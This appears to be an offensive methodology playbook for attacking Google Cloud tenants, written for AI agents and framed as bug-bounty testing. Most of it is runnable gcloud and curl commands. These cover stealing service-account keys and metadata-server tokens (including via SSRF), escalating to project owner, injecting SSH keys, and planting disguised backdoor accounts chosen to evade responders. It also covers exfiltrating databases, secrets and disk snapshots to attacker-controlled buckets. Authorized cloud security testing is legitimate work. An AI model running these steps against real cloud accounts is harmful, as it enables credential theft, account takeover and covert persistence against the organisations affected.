---
technology: "Google Cloud attack surface (IAM / service accounts / metadata server)"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.1
source: "six2dez/pentest-book (enumeration/cloud/gcp.md + enumeration/cloud/serverless.md, no license — rewritten with attribution), accessed 2026-11-13; Supplement 2026-11-13: rewritten from dafthack/CloudPentestCheatsheets (cheatsheets/GCP.md), MIT, accessed 2026-11-13"
provenance: "upstream-only (pentest-book + primary sources); zero corpus evidence by design — endpoint shapes, header requirements, org-policy defaults, and impersonation semantics verified against Google Cloud docs (VM metadata overview, creating-managing service-account keys, service account impersonation, Cloud Run/Functions securing) during authoring, 2026-11-13"
---

Companion page: [[gcp|Google Cloud attack surface overview]] — IAM / service accounts / metadata server in one model. Tool notes live in the tools vault; Appendix A names tools in prose.

# GCP bug bounty methodology (IAM / service accounts / metadata server)

**Scope:** service-account credential loot, gcloud-driven enumeration, IAM privilege-escalation paths, metadata-server abuse from compute footholds (including SSRF-to-creds), Cloud Storage and Cloud Functions abuse, persistence. **Out of scope:** GKE control-plane internals (see the [[kubernetes]] unit) — only the `get-credentials` pivot is claimed here; generic web bugs in hosted apps belong to the web-stack units.

**Authorization:** IAM mutations are tenant-global and loudly logged. Prefer reads (`get-iam-policy`, `describe`) over writes; where a write proves a primitive (one key created, one SSH key added), record it, revert if permitted, and never leave a binding behind.

## Decision tree (one screen)

1. Key JSON / gcloud directory found → Phase 2 (activate), Phase 3 (enumerate).
2. Shell on a GCP VM / Cloud Function / Cloud Run app → Phase 4 FIRST (metadata server, zero privileges needed).
3. SSRF in a GCP-hosted app → Phase 4 (header-capable fetch required: `Metadata-Flavor: Google`).
4. Any principal with `iam.serviceAccountKeys.create` or token-creator on a juicier SA → Phase 5A.
5. `setIamPolicy` on project/folder/org → Phase 5B (self-grant owner).
6. compute metadata-write / setServiceAccount / functions update rights → Phase 5C.
7. Need to stay → Phase 6.

## Phase 1 — External recon (no credentials)

- Bucket/App-Engine namespace by permutation on the org's name fragments: cloud_enum (all three clouds at once), GCPBucketBrute for depth (`-k keyword -u` for open-only).
- Public bucket HTTP face: `curl https://storage.googleapis.com/<bucket>/` — XML errors vs listings reveal existence and exposure without any auth.
- Workspace check: does the company's email domain authenticate against Google (managed accounts vs federated) — decides phishing shape.

## Phase 2 — Credential loot and activation

| Loot | Where | Use |
| --- | --- | --- |
| SA JSON key (`"type": "service_account"`, `private_key`, `client_email`) | source trees, CI variables, Downloads, backups | `gcloud auth activate-service-account --key-file=key.json` |
| `~/.config/gcloud/` whole directory | any user's home (`sudo find /home -name "credentials.db"`) | copy, chown, `gcloud auth list` — replays named configurations |
| Application Default Credentials | `~/.config/gcloud/application_default_credentials.json` | client libraries and SSRF-tooling pick it up automatically |
| Access/refresh tokens | process env, metadata responses | direct API calls |

Stolen-user path: copy the gcloud directory rather than the db alone; named configurations (`gcloud config configurations activate <name>`) keep the operator's project/impersonation defaults.

## Phase 3 — Authenticated enumeration

```
gcloud organizations list; gcloud organizations get-iam-policy <org>
gcloud projects list; gcloud config set project <project-id>
gcloud projects get-iam-policy <project-id> --format=json      # roles <-> members map; grep allUsers/allAuthenticatedUsers
gcloud asset search-all-iam-policies --project=<id>            # who holds what, everywhere (needs cloudasset)
gcloud iam service-accounts list; gcloud iam service-accounts keys list --iam-account=<sa>
gcloud iam roles list --project=<id>                           # custom roles: read their permissions
gcloud compute instances list; gcloud compute instances describe <vm> --zone=<z> --format=json   # serviceAccounts[].scopes, metadata ssh-keys
gcloud storage buckets list / gsutil ls; gcloud sql instances list; gcloud spanner instances list
gcloud kms keyrings list; gcloud source repos list
gcloud functions list                                            # Phase 7
```

Follow the bindings: for each SA you control or can act as, list what roles IT holds — principal-and-resource duality means the SA list is the escalation candidate list.

## Phase 4 — Metadata server (compute foothold / SSRF)

```
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"      # OAuth token
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"     # caps the default token
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"           # secrets in boot code
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"                  # login map
```

Hostnames `metadata.google.internal`, `metadata`, and the IP `169.254.169.254` are interchangeable (an IPv6 form exists too). Use the token directly: `curl -H "Authorization: Bearer <token>" "https://storage.googleapis.com/storage/v1/b?project=<id>"` or set it as gcloud credentials. Respect the scopes ceiling for the default SA; any other credential path ignores it. On SSRF: the header is mandatory — plain GETs to the IP are refused, so the fetch primitive must allow custom headers (or you pivot through a service that adds them).

## Phase 5 — Privilege escalation (permission → primitive)

**5A Service-account takeover** (the highest-yield family):

- `iam.serviceAccountKeys.create` on target SA → `gcloud iam service-accounts keys create key.json --iam-account=<sa>` → activate → full long-lived identity. Org policy `iam.disableServiceAccountKeyCreation` blocks it where enforced (default-on for orgs created since 2024-05-03) — then use:
- token-creator rights (`roles/iam.serviceAccountTokenCreator` or SA-actAs on the target) → `gcloud auth print-access-token --impersonate-service-account=<sa>`, or append `--impersonate-service-account=<sa>` to ANY command. Short-lived and dual-identity in audit logs — cleaner to use, easier to attribute.

**5B Policy-write on the container**: `resourcemanager.projects.setIamPolicy` (or folder/org equivalent) → `gcloud projects add-iam-policy-binding <id> --member=user:<you> --role=roles/owner`. One command, game over.

**5C Compute and function shapes**:

- `compute.instances.setMetadata` → `gcloud compute instances add-metadata <vm> --metadata=ssh-keys="<user>:<pubkey>"` then SSH as that user; project-level `compute project-info add-metadata` does it for every instance in the project.
- `compute.instances.setServiceAccount` → re-bind a VM you control to a privileged SA (stop/start required), then read its token from metadata.
- `cloudfunctions.functions.create/update` (gen1) or `run.services.update` (gen2/Cloud Run) → deploy/update code that runs as `--service-account=<privileged-sa>`; environment variables ride along.
- `gcloud compute ssh` writes your public key into project metadata as a side effect — a self-granting login path from any compute SSH permission.

## Phase 6 — Persistence

Backdoor SA with a boring display name ("Monitoring Service") + `roles/editor` binding + user-managed key; project-wide ssh-keys metadata entry (survives instance churn); a redeployed HTTP function with `--allow-unauthenticated` and your trigger; an extra key on an EXISTING privileged SA (no new object, diff-able only by key id). Prefer reuse over creation — new principals are the first thing a responder greps.

## Phase 7 — Data planes worth the detour

- **Storage:** `gsutil ls -r gs://<bucket>`, `gsutil -m cp -r` for bulk; `gsutil iam get/ch` for grants; sensitive-name hunt (`*.json`, `*.pem`, `*secret*`, `*.env`); write access to a web-served bucket is the same webshell-drop chain as AWS S3 ([[aws]]).
- **SQL:** `gcloud sql export sql <instance> gs://<your-bucket>/dump.gz --database=<db>` — export lands in a bucket you read.
- **KMS:** `gcloud kms decrypt` on ciphertext found in loot — secrets sealed with the project's own keyring.
- **Compute disk copies:** snapshot a target disk, create an instance from the snapshot (`--source-snapshot`), mount offline — full filesystem without touching the source VM.
- **Serverless functions:** see the overview's Cloud Functions section — `functions describe` (SA email, env vars, `sourceArchiveUrl` → source zip), `functions get-iam-policy` (public invoke?), `functions call --data`, update-to-deploy under a privileged SA, and Pub/Sub topic publish as an injection face into event-driven code.

## Fingerprint signatures

- `metadata.google.internal` refusing a headerless GET but answering with `Metadata-Flavor: Google` = healthy metadata server (and a header-capable SSRF target).
- `get-iam-policy` members containing `allUsers` / `allAuthenticatedUsers` = public surface regardless of every other control.
- XML `AccessDenied`/listing responses from `storage.googleapis.com/<bucket>/` distinguish private vs public vs nonexistent.
- `describe --format=json` on an instance: `serviceAccounts[].scopes[]` caps the default credential; `metadata.items[].value` carrying `ssh-keys` or `startup-script` is direct loot.

## Appendix A — tools (prose)

Multi-cloud reconnaissance: cloud_enum (buckets/App Engine/Azure/AWS in one sweep), ScoutSuite (`scout gcp`), prowler (`prowler gcp`). Bucket enumeration: GCPBucketBrute. IAM collection and analysis: gcp-iam-collector, PurplePanda, Hayat, gcp_firewall_enum for firewall rules, gcloud's own asset search. Everything else is native gcloud/gsutil/bq — the CLI IS the post-exploitation framework.

## Supplement (2026-11-13) — enumeration breadth (dafthack rewrite)

Rewritten from dafthack/CloudPentestCheatsheets (`cheatsheets/GCP.md`), MIT, accessed 2026-11-13. Verified at write time against Google Cloud references: `asset search-all-resources` scope forms and its `cloudasset.assets.searchAllResources` permission, Secret Manager and Artifact Registry verb forms, `functions logs read` (gen1/gen2) and `logging read` filters. Two source forms deliberately not carried: the `gcloud beta compute ssh` spelling (needlessly beta-namespaced; the GA form and its metadata-key side effect are already Phase 5C) and the bucket-grant step `gsutil acl ch` (legacy ACL mechanics — uniform bucket-level access, the default for new buckets, rejects ACL changes; Phase 7's "bucket you read" framing already uses IAM instead).

**G1. The enabled-API list is the real scope.** `gcloud services list --enabled` — every data plane worth attacking (secretmanager, artifactregistry, sqladmin, run, kms...) must be enabled first. The list decides which Phase 7 detours exist before you burn permission probes on disabled APIs.

**G2. Cloud Asset resource search, the other half.** Phase 3 carries `search-all-iam-policies`; `gcloud asset search-all-resources --scope=projects/<project-id>` (folders and orgs work as scopes too; caller needs `cloudasset.assets.searchAllResources`) is the resource-side counterpart — the full inventory in one call, sliceable with `--query=` and `--asset-types=`.

**G3. Secret Manager walk.** `gcloud secrets list` → `gcloud secrets versions access latest --secret=<name>` (any version number works) — the direct counterpart of the AWS SecretsManager/SSM walk in [[aws]], and the first place GCP shops park service credentials now that SA key creation is policy-blocked.

**G4. Artifact Registry.** `gcloud artifacts repositories list` → `gcloud artifacts docker images list <repository>` — image inventory; `gcloud auth configure-docker` then pull for source-and-secret inspection of what the estate actually ships.

**G5. Network inventory.** `gcloud compute networks list`, `networks subnets list`, `firewall-rules list` (hunt `0.0.0.0/0` source ranges), `addresses list` / `forwarding-rules list` (the external-IP map), `vpn-tunnels list` / `interconnects list` (the on-prem bridges). The gcp_firewall_enum tool named in Appendix A automates the firewall part.

**G6. Function logs.** `gcloud functions logs read <function> --limit <n>` (gen1; add `--gen2` for second-generation functions) — error traces and logged payloads; where the function writes straight to Cloud Logging, `gcloud logging read 'resource.type="cloud_function"' --limit 20` is the same view.

**G7. Cloud Logging walks.** `gcloud logging read '<filter>'` with `resource.type="gce_instance"`, `"cloud_function"`, or `protoPayload.serviceName="iam.googleapis.com"` — the last is the admin-activity trail: who changed which IAM binding, when. It needs a logging-read grant, but where it exists it outclasses manual re-enumeration.

**G8. Source Repositories pay off in clones.** Phase 3 lists them; `gcloud source repos clone <repo>` turns the listing into full source — credentials, internal endpoints — the cheapest code access in the platform when `source.repos.get` is already granted.
